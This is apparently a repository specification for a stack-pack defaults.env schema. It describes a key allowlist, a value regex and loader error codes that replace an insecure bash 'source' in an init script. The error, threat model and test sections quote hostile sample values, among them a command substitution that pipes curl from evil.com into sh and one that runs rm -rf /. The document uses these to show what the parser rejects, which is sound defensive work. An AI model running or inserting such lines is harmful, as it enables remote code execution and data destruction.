# Contract: Stack-Pack `defaults.env` Schema

**Feature**: 256
**Status**: Specification (FR-001 + FR-002)
**Date**: 2026-05-04
**Implementation files**: `stacks/<pack>/defaults.env` (per stack pack); `STACK_PACK_ALLOWED_KEYS` array in `scripts/init.sh` (Stream 2 deliverable)
**Location**: `contracts/stack-pack-defaults-schema.md` (canonical repo-root contract; moved from `specs/256-source-pattern-hardening/contracts/` at T006 of Stream 1)

---

## Purpose

Documents the canonical key set and value-shape constraints for `stacks/<pack>/defaults.env` files — the per-stack-pack configuration file read by `init.sh:106` post-F-2 via `aod_template_load_kv_file`.

This contract is the **lockstep counterpart** of the `STACK_PACK_ALLOWED_KEYS` bash array in `scripts/init.sh`. Any future stack-pack key addition requires updating BOTH this file AND the array in lockstep (analogous to F-1's canonical-12 lockstep contract for personalization placeholders documented in `contracts/personalization-schema.md`).

---

## Canonical Key Set

The following 5 keys are the locked set as of F-2 (BLP-02 Wave 2):

| # | Key | Required | Value Type | Example | Notes |
|---|-----|----------|------------|---------|-------|
| 1 | `TECH_STACK` | Yes | Allowlist string | `nextjs` | Primary frontend/backend stack identifier |
| 2 | `TECH_STACK_DATABASE` | Yes | Allowlist string | `supabase`, `postgres`, `none` | Database choice (or `none` if not applicable) |
| 3 | `TECH_STACK_VECTOR` | Yes | Allowlist string | `pgvector`, `pinecone`, `none` | Vector store choice (or `none`) |
| 4 | `TECH_STACK_AUTH` | Yes | Allowlist string | `supabase`, `next-auth`, `none` | Auth provider choice |
| 5 | `CLOUD_PROVIDER` | Yes | Allowlist string | `vercel`, `aws`, `gcp` | Deployment cloud provider |

**Whitelist source of truth**: the `STACK_PACK_ALLOWED_KEYS` bash array in `scripts/init.sh`:

```bash
STACK_PACK_ALLOWED_KEYS=(TECH_STACK TECH_STACK_DATABASE TECH_STACK_VECTOR TECH_STACK_AUTH CLOUD_PROVIDER)
```

**Lockstep rule**: any future addition to this list requires:
1. Adding the new key to `STACK_PACK_ALLOWED_KEYS` in `init.sh`.
2. Adding a row to the table above in this contract file.
3. Updating ALL shipped stack packs (`stacks/<pack>/defaults.env`) to include the new key (or fail-fast at next `init.sh` run with the missing-key error).
4. CHANGELOG entry documenting the additive contract change.

---

## Value-Shape Rules

Per FR-001 regex, each `KEY=VALUE` line in `defaults.env` MUST conform to:

```regex
^[A-Z_][A-Z_0-9]*=("[^"$\\`]*"|'[^']*'|[A-Za-z0-9._/:@+=-]*)$
```

**Three value forms supported**:

1. **Unquoted (allowlisted charset)**: `KEY=value`
   - Allowlist: `[A-Za-z0-9._/:@+=-]*` (alphanumeric + dot, underscore, slash, colon, at-sign, plus, equals, hyphen).
   - **Zero-or-more** quantifier — empty unquoted (`KEY=`) is allowed (per B-1 empty-value support).
   - Rejects: shell metachars (`$`, `\`, backtick, `;`, `|`, `&`, `*`, `?`, `<`, `>`, `(`, `)`, `[`, `]`, `{`, `}`), spaces, control characters.
   - Example: `TECH_STACK=nextjs`, `CLOUD_PROVIDER=vercel`, `EMPTY=` (bare form).

2. **Double-quoted** (no interior metachars): `KEY="value with spaces"`
   - Permitted: anything except `"`, `$`, `\`, backtick.
   - Rejects: command substitution `"$(...)"`, parameter expansion `"${...}"`, escape sequences `"\n"`, backtick command substitution.
   - Example: `TECH_STACK="next.js with TypeScript"`.

3. **Single-quoted** (literal): `KEY='value with $special chars'`
   - Permitted: anything except `'` (single-quote).
   - In bash, single-quotes inhibit interpolation, so embedded `$`, `\`, backtick are literal.
   - Example: `TECH_STACK_DATABASE='postgres with extensions'`.

**File format rules**:

- One `KEY=VALUE` per line.
- Keys MUST be uppercase (matches the regex left-side `^[A-Z_][A-Z_0-9]*`).
- Comment lines start with `#` (after leading-whitespace strip) — skipped during parse.
- Blank lines — skipped during parse.
- CRLF line endings tolerated (Windows-edited config compatibility).
- Leading whitespace tolerated (adopters who indent for readability) — stripped during parse.
- File ending without trailing newline tolerated (the parser's here-string adds a trailing newline back).

---

## Loader Invocation

Post-F-2, `init.sh:106` invokes the loader:

```bash
STACK_PACK_ALLOWED_KEYS=(TECH_STACK TECH_STACK_DATABASE TECH_STACK_VECTOR TECH_STACK_AUTH CLOUD_PROVIDER)
aod_template_load_kv_file "stacks/$SELECTED_PACK/defaults.env" "STACK_" STACK_PACK_ALLOWED_KEYS
```

**Caller-scope variables produced**:

| KEY (from file) | Caller-scope variable (with `STACK_` prefix) |
|---|---|
| `TECH_STACK` | `STACK_TECH_STACK` |
| `TECH_STACK_DATABASE` | `STACK_TECH_STACK_DATABASE` |
| `TECH_STACK_VECTOR` | `STACK_TECH_STACK_VECTOR` |
| `TECH_STACK_AUTH` | `STACK_TECH_STACK_AUTH` |
| `CLOUD_PROVIDER` | `STACK_CLOUD_PROVIDER` |

The `STACK_` prefix is REQUIRED (not optional) — disambiguates stack-pack-derived values from canonical-12 personalization values (which also flow through caller scope) and prevents accidental cross-namespace collision.

---

## Whitelist Enforcement

The loader REJECTS:

1. **Unknown keys** (not in `STACK_PACK_ALLOWED_KEYS`):
   ```
   [aod] ERROR: disallowed key 'CUSTOM_HOOK' in stacks/malicious-pack/defaults.env (line 3); allowed: TECH_STACK TECH_STACK_DATABASE TECH_STACK_VECTOR TECH_STACK_AUTH CLOUD_PROVIDER
   ```
   Exit code: **8**.

2. **Missing required keys**:
   ```
   [aod] ERROR: required key 'CLOUD_PROVIDER' missing from stacks/incomplete-pack/defaults.env; expected: TECH_STACK TECH_STACK_DATABASE TECH_STACK_VECTOR TECH_STACK_AUTH CLOUD_PROVIDER
   ```
   Exit code: **8**.

3. **Malformed values** (regex failure):
   ```
   [aod] ERROR: malformed line 3 in stacks/malicious-pack/defaults.env: CUSTOM_HOOK="$(curl evil.com|sh)"
   ```
   Exit code: **8**.

---

## Threat Model Mitigation

This schema closes **TACHI-VULN-6f5a95085056** (HIGH, A03 Injection): the previous behavior was to `source` `defaults.env` as bash, executing arbitrary code at init time. Post-F-2, the file is parsed as data — never executed. A contributed pack from the community (or a tampered local pack) cannot place arbitrary bash in `defaults.env` and have it execute — the regex rejects it before any `printf -v` assignment runs.

**Threat model**: stack packs are the **documented extension point** for tachi adopters. Community-contributed packs may be:
- Honest (well-formed `defaults.env` with the canonical 5 keys).
- Tampered (a typosquatting pack name, a compromised upstream contributor account).
- Malicious (intentional injection via `CUSTOM_HOOK="$(rm -rf /)"` or similar).

Pre-F-2: all three flow through `source`, executing whatever the pack contains. Post-F-2: only the well-formed case loads cleanly; tampered/malicious packs are rejected exit 8 with a clear error naming the line + content.

---

## Migration Guidance for Existing Adopters

**For adopters with custom stack packs**:

If your `stacks/<pack>/defaults.env` contains:

- ✓ Only the canonical 5 keys with allowlist values: **no migration needed** — your pack loads cleanly.
- ⚠️ Custom keys beyond the canonical 5: **migration required** — either propose the new key as a contract addition (lockstep update) or remove the key from your pack.
- ⚠️ Values with shell metacharacters (e.g., `TECH_STACK="next.js \\ vercel"` with a backslash): **migration required** — quote with single-quotes (`TECH_STACK='next.js \\ vercel'`) or use the allowlisted unquoted charset.
- ⚠️ Bash code masquerading as values (e.g., `TECH_STACK="$(uname -s)"`): **rejected exit 8** — this was always insecure; the contract has always been "KV-format only".

CHANGELOG (per FR-008 AC-8.4) provides this migration guidance.

---

## Test Coverage

Test-2 (`tests/scripts/test_template_config_load_integration.py`) and Test-4 (`tests/scripts/test_init_sh_defaults_env.py`) verify this contract:

- **Test-2 Site A**: malicious-pack fixture with `CUSTOM_HOOK="$(touch /tmp/F-256-pwned)"` → exit 8 + no /tmp file created.
- **Test-4 case 1**: each shipped stack pack (`nextjs-supabase`, `fastapi-react`) loads cleanly on macOS bash 3.2 + Linux bash 5.x (Day-5 slip-watch GREEN-LIGHT condition 2).
- **Test-4 case 2**: malicious-pack fixture rejected exit 8 + `init.sh` aborts.
- **Test-4 case 3**: missing-key fixture (e.g., pack omitting `CLOUD_PROVIDER`) → exit 8 with missing-key error.

---

## Cross-References

- F-1 personalization contract: [specs/248-substitution-surface-hardening/contracts/personalization-schema.md](../specs/248-substitution-surface-hardening/contracts/personalization-schema.md) (existing — the precedent for canonical-key + lockstep contract pattern; expected to migrate to the canonical repo-root `contracts/` directory in a follow-on tidy-up; not in F-2 scope)
- Loader contract (specs-internal): [specs/256-source-pattern-hardening/contracts/config-load-helper-contract.md](../specs/256-source-pattern-hardening/contracts/config-load-helper-contract.md)
- Spec FR-002: [specs/256-source-pattern-hardening/spec.md §Functional Requirements](../specs/256-source-pattern-hardening/spec.md#functional-requirements)
- Plan Stream 2 Site A: [specs/256-source-pattern-hardening/plan.md §Stream 2 Site A](../specs/256-source-pattern-hardening/plan.md#stream-2--refactor-4-call-sites-critical-path-25-275-days-per-h-2-blocks-on-stream-1)
- ADR-040 (post-Stream-3 commit): TBD [docs/architecture/02_ADRs/ADR-040-config-file-parsing-hardening.md](../docs/architecture/02_ADRs/ADR-040-config-file-parsing-hardening.md)
- vuln_id closed: TACHI-VULN-6f5a95085056 (HIGH)
